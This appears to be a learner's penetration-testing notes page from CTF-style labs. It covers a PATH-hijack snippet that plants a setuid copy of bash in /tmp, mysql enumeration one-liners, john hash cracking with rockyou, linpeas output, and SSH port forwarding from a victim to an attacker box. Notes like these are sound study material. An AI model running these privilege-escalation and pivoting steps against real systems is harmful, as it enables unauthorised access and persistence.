---
sort : 1
--- 


# Soon... 


Network/wireless/physical/Firewall/Social Eng/ .... Penetration testing ?? 
<!-- https://purplesec.us/types-penetration-testing/ -->


<!-- https://start.me/p/PwmnBd/web --> ALL 
<!-- https://www.mindmeister.com/1470766611/web-app-pentest?fullscreen=1 -->



Finding real IP behind CloudFlare or Tor
<!-- https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/ -->



# be curious and not just a script kiddie.














# Attacks list

* PATH hijack  
    ```bash
    cd /tmp 
    export PATH=/tmp:$PATH

    echo "reverse shell" > bin
    # OR
    echo -ne '#!/bin/bash\ncp /bin/bash /tmp/bash\nchmod 4755 /tmp/bash' > bin 
    
    chmod +x bin
    ...

    ```
* Execution After Redirect (EAR)
* mysql ?? 
    ``` 
    mysql -u root -p 'passwd between qoutes' -e 'show databases;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'show tables;'
    mysql -u root -p 'passwd between qoutes' databaseName -e 'select * from table;' 
    ```







# Hash cracking
```bash
# md5   $1$ 

echo "hash" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long hash.txt



# if you know the salt 




```

Single Page Application (SPA)" that was made using Vue Js.






# Linpeas.sh Analysis !! 
```bash
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1837/node /u	sr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -   
```


this shows the running services (maybe another web server ^^)

```
/etc/apache2/sites-enabled 
/etc/nginx/sites-enabled
```

# SSH Tunneling / port forwarding

https://linuxhint.com/ssh-port-forwarding-linux/

```bash
# local port forwarding : run on attacker box		
	
$ ssh -i User -L 8888:127.0.0.1:8000 User@10.10.11.105	==> after running it you will connect to the machine as a User ^^ 
$ id 
    uid=1001(User) gid=1001(User) groups=1001(User)

# go to the browser :: http://127.0.0.1:8888/   ===> forwarded to 127.0.0.1:8000 on the victim machine 

# means locally (on the attacker machine) bind my localhost with 8888 port to the service running on 127.0.0.1:8000 thro this {ssh server} User@10.10.11.105
```

==> in /etc/sshd_config  ==> GateWayPorts yes ==> default is no   ////    must be yes

```bash
# remote port forwarding : run on victim box 		

$ ssh -R 8888:127.0.0.1:8000 Attacker@10.10.x.x

# means expose the local service (on the victime machine) running on port 8000 to port 8888 on this ssh server Attacker@10.10.x.x
```